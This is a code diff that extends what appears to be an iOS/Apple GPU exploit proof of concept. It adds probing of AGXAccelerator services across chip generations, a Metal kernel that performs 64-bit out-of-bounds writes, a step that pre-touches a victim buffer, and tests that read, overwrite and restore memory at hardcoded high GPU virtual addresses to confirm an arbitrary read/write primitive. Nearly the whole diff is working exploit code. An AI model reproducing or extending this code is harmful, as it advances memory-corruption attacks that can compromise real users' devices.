@@ -164,10 +164,23 @@ static uint32_t create_surface(io_connect_t conn, NSString *xml, const char *tag
 static uint64_t agx_map(uint32_t sid, uint64_t *span, io_connect_t *out_ac) {
     *span = 0;
     *out_ac = 0;
-    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault,
-                                                   IOServiceMatching("AGXAcceleratorG14P"));
+    io_service_t agx = 0;
+    const char *agx_names[] = {
+        "AGXAcceleratorG14P",  // A15
+        "AGXAcceleratorG18P",  // A19 Pro
+        "AGXAcceleratorG13P",
+        "AGXAcceleratorG16P",
+    };
+    for (size_t ai = 0; ai < sizeof(agx_names)/sizeof(agx_names[0]); ai++) {
+        agx = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                          IOServiceMatching(agx_names[ai]));
+        if (agx) {
+            L(@"[AGX] service=%s", agx_names[ai]);
+            break;
+        }
+    }
     if (!agx) {
-        L(@"[AGX] AGXAcceleratorG14P not found");
+        L(@"[AGX] no AGXAccelerator service");
         return 0;
     }
     io_connect_t ac = 0;
@@ -305,6 +318,11 @@ static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_
         "                 device ulong *out [[buffer(1)]],\n"
         "                 constant long &delta [[buffer(2)]]) {\n"
         "  out[0] = buf[delta / 8];\n"
+        "}\n"
+        "kernel void wr64(device ulong *buf [[buffer(0)]],\n"
+        "                 constant long &delta [[buffer(1)]],\n"
+        "                 constant ulong &val [[buffer(2)]]) {\n"
+        "  buf[delta / 8] = val;\n"
         "}\n";
     NSError *err = nil;
     id<MTLLibrary> lib = [dev newLibraryWithSource:src options:nil error:&err];
@@ -312,17 +330,41 @@ static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_
     id<MTLFunction> fwr = [lib newFunctionWithName:@"wr"];
     id<MTLFunction> frd = [lib newFunctionWithName:@"rd"];
     id<MTLFunction> frd64 = [lib newFunctionWithName:@"rd64"];
+    id<MTLFunction> fwr64 = [lib newFunctionWithName:@"wr64"];
     id<MTLComputePipelineState> pwr = fwr ? [dev newComputePipelineStateWithFunction:fwr error:&err] : nil;
     id<MTLComputePipelineState> prd = frd ? [dev newComputePipelineStateWithFunction:frd error:&err] : nil;
     id<MTLComputePipelineState> prd64 = frd64 ? [dev newComputePipelineStateWithFunction:frd64 error:&err] : nil;
+    id<MTLComputePipelineState> pwr64 = fwr64 ? [dev newComputePipelineStateWithFunction:fwr64 error:&err] : nil;
     if (!pwr || !prd) { L(@"[METAL] pipeline error=%@", err); return; }
 
     id<MTLBuffer> out = [dev newBufferWithLength:16 options:MTLResourceStorageModeShared];
     id<MTLCommandQueue> q = [dev newCommandQueue];
 
-    if (delta > 0 && delta < 0x1000000) {
+    if (delta > 0 && delta < 0x10000000) {
         uint32_t idx = (uint32_t)(delta / 4);
         uint32_t marker = 0x43434343u;
+
+        // Pre-touch the victim through its OWN GPU VA. This establishes its
+        // pages in the GPU context page table; without this, the F1 access at
+        // delta may be silently dropped (see F1OOB_ANALYSIS.md §17.2).
+        {
+            uint32_t idx0 = 0;
+            uint32_t vmark = 0x47474747u;
+            id<MTLCommandBuffer> vb = [q commandBuffer];
+            id<MTLComputeCommandEncoder> ve = [vb computeCommandEncoder];
+            [ve setComputePipelineState:pwr];
+            [ve setBuffer:victim offset:0 atIndex:0];
+            [ve setBytes:&idx0 length:4 atIndex:1];
+            [ve setBytes:&vmark length:4 atIndex:2];
+            [ve dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+            [ve endEncoding];
+            [vb commit];
+            [vb waitUntilCompleted];
+            uint32_t own = 0;
+            memcpy(&own, victim.contents, 4);
+            L(@"[METAL] VICTIM own-va write status=%lu victim[0]=0x%08x expect=0x%08x",
+              (unsigned long)vb.status, own, vmark);
+        }
 
         id<MTLCommandBuffer> wb = [q commandBuffer];
         id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
@@ -424,6 +466,84 @@ static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_
             uint64_t hv = 0;
             if (out.contents) memcpy(&hv, out.contents, 8);
             L(@"[HIGHVA] value=0x%llx", (unsigned long long)hv);
+        }
+    }
+
+    // High-VA write test: read original, write a marker, read back, restore.
+    // If the marker persists, the page is writable; if it reads 0, it is a
+    // read-only zero page or the write was dropped.
+    if (prd64 && pwr64) {
+        uint64_t targets[] = {
+            0x1501000000ULL,
+            0x100000000ULL,
+            0x13400000000ULL + 0x8000ULL,
+        };
+        for (int ti = 0; ti < (int)(sizeof(targets)/sizeof(targets[0])); ti++) {
+            uint64_t target = targets[ti];
+            int64_t d = (int64_t)(target - f1ga);
+            uint64_t orig = 0;
+            L(@"[HIGHVA-W] target=0x%llx delta=0x%llx", target, (unsigned long long)d);
+
+            id<MTLCommandBuffer> rb0 = [q commandBuffer];
+            id<MTLComputeCommandEncoder> re0 = [rb0 computeCommandEncoder];
+            [re0 setComputePipelineState:prd64];
+            [re0 setBuffer:f1buf offset:0 atIndex:0];
+            [re0 setBuffer:out offset:0 atIndex:1];
+            [re0 setBytes:&d length:8 atIndex:2];
+            [re0 dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+            [re0 endEncoding];
+            [rb0 commit];
+            [rb0 waitUntilCompleted];
+            if (rb0.status == MTLCommandBufferStatusError) {
+                L(@"[HIGHVA-W] READ FAULT err=%@", rb0.error);
+                break;
+            }
+            if (out.contents) memcpy(&orig, out.contents, 8);
+
+            uint64_t marker = 0x4142434445464748ULL;
+            id<MTLCommandBuffer> wb2 = [q commandBuffer];
+            id<MTLComputeCommandEncoder> we2 = [wb2 computeCommandEncoder];
+            [we2 setComputePipelineState:pwr64];
+            [we2 setBuffer:f1buf offset:0 atIndex:0];
+            [we2 setBytes:&d length:8 atIndex:1];
+            [we2 setBytes:&marker length:8 atIndex:2];
+            [we2 dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+            [we2 endEncoding];
+            [wb2 commit];
+            [wb2 waitUntilCompleted];
+            if (wb2.status == MTLCommandBufferStatusError) {
+                L(@"[HIGHVA-W] WRITE FAULT err=%@", wb2.error);
+                break;
+            }
+
+            uint64_t back = 0;
+            id<MTLCommandBuffer> rb2 = [q commandBuffer];
+            id<MTLComputeCommandEncoder> re2 = [rb2 computeCommandEncoder];
+            [re2 setComputePipelineState:prd64];
+            [re2 setBuffer:f1buf offset:0 atIndex:0];
+            [re2 setBuffer:out offset:0 atIndex:1];
+            [re2 setBytes:&d length:8 atIndex:2];
+            [re2 dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+            [re2 endEncoding];
+            [rb2 commit];
+            [rb2 waitUntilCompleted];
+            if (out.contents) memcpy(&back, out.contents, 8);
+            L(@"[HIGHVA-W] orig=0x%llx marker=0x%llx back=0x%llx writable=%s",
+              (unsigned long long)orig, (unsigned long long)marker,
+              (unsigned long long)back, (back == marker) ? "YES" : "no");
+
+            // Restore original value.
+            id<MTLCommandBuffer> ob2 = [q commandBuffer];
+            id<MTLComputeCommandEncoder> oe2 = [ob2 computeCommandEncoder];
+            [oe2 setComputePipelineState:pwr64];
+            [oe2 setBuffer:f1buf offset:0 atIndex:0];
+            [oe2 setBytes:&d length:8 atIndex:1];
+            [oe2 setBytes:&orig length:8 atIndex:2];
+            [oe2 dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+            [oe2 endEncoding];
+            [ob2 commit];
+            [ob2 waitUntilCompleted];
+            L(@"[HIGHVA-W] restore status=%lu err=%@", (unsigned long)ob2.status, ob2.error);
         }
     }
 
